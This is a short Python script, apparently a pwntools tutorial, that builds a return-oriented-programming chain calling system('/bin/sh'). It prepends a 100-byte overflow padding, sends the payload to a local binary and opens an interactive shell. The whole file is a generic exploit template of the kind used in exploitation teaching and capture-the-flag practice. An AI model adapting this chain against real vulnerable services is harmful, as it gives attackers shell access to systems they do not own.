#!/usr/bin/env python3
"""
Example: ROP Chain Exploitation

This example demonstrates building and using ROP chains with pwntools.
"""

from pwn import *

# Configuration
context(arch='amd64', os='linux', log_level='info')
BINARY = './binary'

def exploit():
    # Load binary
    elf = ELF(BINARY)
    print(f"[*] Binary: {BINARY}")
    print(f"[*] Protections: {elf.checksec()}")

    # Find /bin/sh string
    print("[*] Finding /bin/sh string...")
    bin_sh = next(elf.search(b'/bin/sh'))
    print(f"[+] /bin/sh at {hex(bin_sh)}")

    # Build ROP chain
    print("[*] Building ROP chain...")
    rop = ROP(elf)
    rop.call('system', [bin_sh])
    print("[+] ROP chain:")
    print(rop.dump())

    # Find buffer overflow offset
    print("[*] Finding buffer overflow offset...")
    offset = 100  # Adjust based on binary

    # Build payload
    print("[*] Building payload...")
    payload = b'A' * offset + rop.chain()
    print(f"[+] Payload size: {len(payload)}")

    # Send exploit
    print("[*] Sending exploit...")
    p = process(BINARY)
    p.sendline(payload)

    # Interact
    print("[*] Interacting with shell...")
    p.interactive()

if __name__ == '__main__':
    exploit()
